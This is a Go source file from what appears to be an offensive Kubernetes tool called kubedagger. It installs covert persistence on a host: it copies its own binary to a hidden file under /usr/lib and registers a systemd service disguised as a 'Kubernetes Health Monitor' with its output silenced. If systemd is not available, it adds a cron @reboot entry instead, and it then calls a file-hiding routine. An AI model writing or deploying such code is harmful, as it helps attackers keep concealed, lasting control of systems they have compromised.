/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package kubedagger

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/sirupsen/logrus"
)

const (
	persistDir     = "/usr/lib/kubedagger"
	persistBinary  = ".kd"
	serviceName    = "kube-health-monitor"
	serviceFile    = "/etc/systemd/system/" + serviceName + ".service"
	cronIdentifier = "# kubedagger-persist"
)

// InstallPersistence copies the current binary to a hidden location and sets up
// automatic restart via systemd (preferred) or cron @reboot fallback.
func (kd *KUBEDagger) InstallPersistence(args []string) error {
	if err := os.MkdirAll(persistDir, 0755); err != nil {
		return fmt.Errorf("failed to create persist directory: %w", err)
	}

	destPath := filepath.Join(persistDir, persistBinary)
	if err := copySelf(destPath); err != nil {
		return fmt.Errorf("failed to copy binary: %w", err)
	}

	if err := os.Chmod(destPath, 0755); err != nil {
		return fmt.Errorf("failed to chmod: %w", err)
	}

	if hasSystemd() {
		if err := installSystemdService(destPath, args); err != nil {
			logrus.Warnf("systemd install failed, falling back to cron: %v", err)
			return installCronReboot(destPath, args)
		}
		logrus.Info("persistence installed via systemd")
	} else {
		if err := installCronReboot(destPath, args); err != nil {
			return fmt.Errorf("cron install failed: %w", err)
		}
		logrus.Info("persistence installed via cron")
	}

	dir := filepath.Dir(destPath)
	file := filepath.Base(destPath)
	kd.FaHideFile("ext4", dir, file)
	return nil
}

// RemovePersistence removes the persistence mechanisms and installed binary.
func (kd *KUBEDagger) RemovePersistence() error {
	if hasSystemd() {
		exec.Command("systemctl", "stop", serviceName).Run()
		exec.Command("systemctl", "disable", serviceName).Run()
		os.Remove(serviceFile)
		exec.Command("systemctl", "daemon-reload").Run()
	}

	removeCronReboot()

	destPath := filepath.Join(persistDir, persistBinary)
	os.Remove(destPath)
	os.Remove(persistDir)
	return nil
}

func copySelf(dest string) error {
	selfPath, err := os.Executable()
	if err != nil {
		return err
	}

	src, err := os.Open(selfPath)
	if err != nil {
		return err
	}
	defer src.Close()

	dst, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer dst.Close()

	_, err = io.Copy(dst, src)
	return err
}

func hasSystemd() bool {
	_, err := exec.LookPath("systemctl")
	return err == nil
}

func installSystemdService(binaryPath string, args []string) error {
	execStart := binaryPath
	if len(args) > 0 {
		execStart += " " + strings.Join(args, " ")
	}

	unit := fmt.Sprintf(`[Unit]
Description=Kubernetes Health Monitor
After=network.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, execStart)

	if err := os.WriteFile(serviceFile, []byte(unit), 0644); err != nil {
		return err
	}

	if out, err := exec.Command("systemctl", "daemon-reload").CombinedOutput(); err != nil {
		return fmt.Errorf("daemon-reload: %s: %w", out, err)
	}
	if out, err := exec.Command("systemctl", "enable", serviceName).CombinedOutput(); err != nil {
		return fmt.Errorf("enable: %s: %w", out, err)
	}

	return nil
}

func installCronReboot(binaryPath string, args []string) error {
	cmd := binaryPath
	if len(args) > 0 {
		cmd += " " + strings.Join(args, " ")
	}

	cronLine := fmt.Sprintf("@reboot %s %s\n", cmd, cronIdentifier)

	existing, _ := exec.Command("crontab", "-l").Output()
	if strings.Contains(string(existing), cronIdentifier) {
		return nil
	}

	newCron := string(existing) + cronLine
	install := exec.Command("crontab", "-")
	install.Stdin = strings.NewReader(newCron)
	return install.Run()
}

func removeCronReboot() {
	existing, err := exec.Command("crontab", "-l").Output()
	if err != nil {
		return
	}

	lines := strings.Split(string(existing), "\n")
	var filtered []string
	for _, line := range lines {
		if !strings.Contains(line, cronIdentifier) {
			filtered = append(filtered, line)
		}
	}

	install := exec.Command("crontab", "-")
	install.Stdin = strings.NewReader(strings.Join(filtered, "\n"))
	install.Run()
}
